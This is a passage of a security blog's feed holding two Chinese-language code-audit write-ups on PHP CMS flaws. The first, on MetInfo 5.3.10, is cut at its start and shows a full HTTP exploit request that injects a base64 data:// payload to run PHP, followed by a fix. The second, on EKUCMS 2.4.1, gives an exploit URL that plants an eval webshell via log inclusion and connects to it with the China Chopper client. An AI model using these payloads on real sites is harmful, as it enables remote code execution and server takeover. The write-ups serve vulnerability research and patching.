<p>这样我们构造exp进行测试，前提后台开启了登录验证码：<br><figure class="highlight perl"><table><tr><td class="code"><pre><div class="line">POST /MetInfo_5.<span class="number">3.10</span>/admin/login/login_check.php?langset=cn&amp;depth=data:<span class="regexp">//text</span><span class="regexp">/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/</span><span class="number">1.1</span></div><div class="line">Host: <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span></div><div class="line">Content-Length: <span class="number">83</span></div><div class="line">Cache-Control: max-age=<span class="number">0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,image/webp,*<span class="regexp">/*;q=0.8</span></div><div class="line">Origin: http:/<span class="regexp">/127.0.0.1</span></div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">45.0</span>.<span class="number">2454.101</span> Safari/<span class="number">537.36</span></div><div class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</div><div class="line">Referer: http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/MetInfo_5.<span class="number">3.10</span>/admin/login/login.php</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></div><div class="line">Cookie: _ga=GA1.<span class="number">1.1522517218</span>.<span class="number">1476456267</span>; tablepage_json=<span class="number">0</span>%7Csystem%2Cnews%2Cdonews_info; ft127001=<span class="number">0</span>; recordurl=%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn; re_url=http%3A%2F%2F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%2FMetInfo_5.<span class="number">3.10</span>%2Fadmin%2F; met_capcha=<span class="number">1</span>f1ezzrSrlMNL9bl5TC1%2F2CBMinv2dvD8CX74vlrMRbq</div><div class="line">Connection: <span class="keyword">close</span></div><div class="line"></div><div class="line">action=login&amp;login_name=admin&amp;login_pass=<span class="number">123456</span>&amp;code=<span class="number">8</span>CAA&amp;Submit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
<p>执行了phpinfo()<br><img src="http://p1.bpimg.com/567571/029868dcb218554d.png" alt=""></p>
<p>因为使用了data://，所以需要php.ini 中allow_url_include ＝on</p>
<h3 id="0x04、漏洞修复"><a href="#0x04、漏洞修复" class="headerlink" title="0x04、漏洞修复"></a>0x04、漏洞修复</h3><p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-MetInfo&quot;&gt;&lt;a href=&quot;#0x00-MetInfo&quot; class=&quot;headerlink&quot; title=&quot;0x00 MetInfo&quot;&gt;&lt;/a&gt;0x00 MetInfo&lt;/h3&gt;&lt;p&gt;MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。&lt;br&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://blog.dropsec.xyz/tags/php/"/>
    
      <category term="代码审计" scheme="http://blog.dropsec.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>易酷CMS文件包含</title>
    <link href="http://blog.dropsec.xyz/2016/11/20/%E6%98%93%E9%85%B7CMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://blog.dropsec.xyz/2016/11/20/易酷CMS文件包含/</id>
    <published>2016-11-20T08:23:48.000Z</published>
    <updated>2017-03-15T00:17:02.787Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-先说说文件包含的关键函数"><a href="#0x01-先说说文件包含的关键函数" class="headerlink" title="0x01 先说说文件包含的关键函数"></a>0x01 先说说文件包含的关键函数</h4><p>php文件包含函数include、include_once、require、require_once 区别</p>
<p>1、在错误的处理上</p>
<p>require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。</p>
<p>ps：在PHP4.3.5之前不会报错<br><a id="more"></a><br>如果你想在出错的地方就停止程序，那么你就选择require吧。include()就不是这样，程序还是会运行，同时要保证包含路径是正确的。</p>
<p>2、include（）<br>include()语句将在其被调用的位置处包含一个文件。包含后运行包含的文件。</p>
<p>3、include_once()<br>include_once()在执行包含文件并运行文件，这和include（）类似，唯一不同的是include_once()会判断是否已经执行过，如果已经包含，则忽略这次包含。</p>
<p>4、require()<br>require()在很大的程度上和include()相同，有两个重要的区别。首先无论执行的语句如何，只要出现了require(filename)，就会包含这个文件，即使语句是false。其次看上文中的1。</p>
<p>5、require_once()<br>require_once()在很大程度上和require()相同。唯一的区别就是require_once()会判断包含的文件是不是已经被执行过，避免函数的重定义和变量重新赋值。</p>
<h4 id="0x02-代码分析："><a href="#0x02-代码分析：" class="headerlink" title="0x02 代码分析："></a>0x02 代码分析：</h4><p>路径：/core/Lib/Action/Home/MyAction.class.php</p>
<p>1、$id变量来自于GET传入，之后又传到了display函数，display函数的参数是模板的名称。</p>
<p><img src="http://obh16g4rw.bkt.clouddn.com/46.png" alt=""><br>2、跟踪display函数，传值到模板处理函数fetch()   view.class.php(163-210）<br><img src="http://obh16g4rw.bkt.clouddn.com/47.png" alt=""> </p>
<p>调用非默认模板，模板阵列分量分解直接载入模板，没有做过滤处理，直接include<br>3、对包含文件的处理 /core/ThinkPHP/Lib/Think/Core/View.class.php (374-391)<br><img src="http://obh16g4rw.bkt.clouddn.com/48.png" alt=""></p>
<p>直接引入其他模板的操作，无任何过滤</p>
<h4 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h4><p>1、通过以上函数的跟踪，发现包含点，构造一句话，利用thinphp日志记录，写入一句话</p>
<p>exp：<a href="http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}" target="_blank" rel="external">http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}</a><br><img src="http://obh16g4rw.bkt.clouddn.com/49.png" alt=""><br><img src="http://obh16g4rw.bkt.clouddn.com/50.png" alt=""></p>
<p>2、包含一句话（利用日志文件）<br> <img src="http://obh16g4rw.bkt.clouddn.com/51.png" alt=""><br>3、菜刀连接<br><img src="http://obh16g4rw.bkt.clouddn.com/52.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-先说说文件包含的关键函数&quot;&gt;&lt;a href=&quot;#0x01-先说说文件包含的关键函数&quot; class=&quot;headerlink&quot; title=&quot;0x01 先说说文件包含的关键函数&quot;&gt;&lt;/a&gt;0x01 先说说文件包含的关键函数&lt;/h4&gt;&lt;p&gt;php文件包含函数include、include_once、require、require_once 区别&lt;/p&gt;
&lt;p&gt;1、在错误的处理上&lt;/p&gt;
&lt;p&gt;require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。&lt;/p&gt;
&lt;p&gt;ps：在PHP4.3.5之前不会报错&lt;br&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.dropsec.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件包含" scheme="http://blog.dropsec.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
</feed>
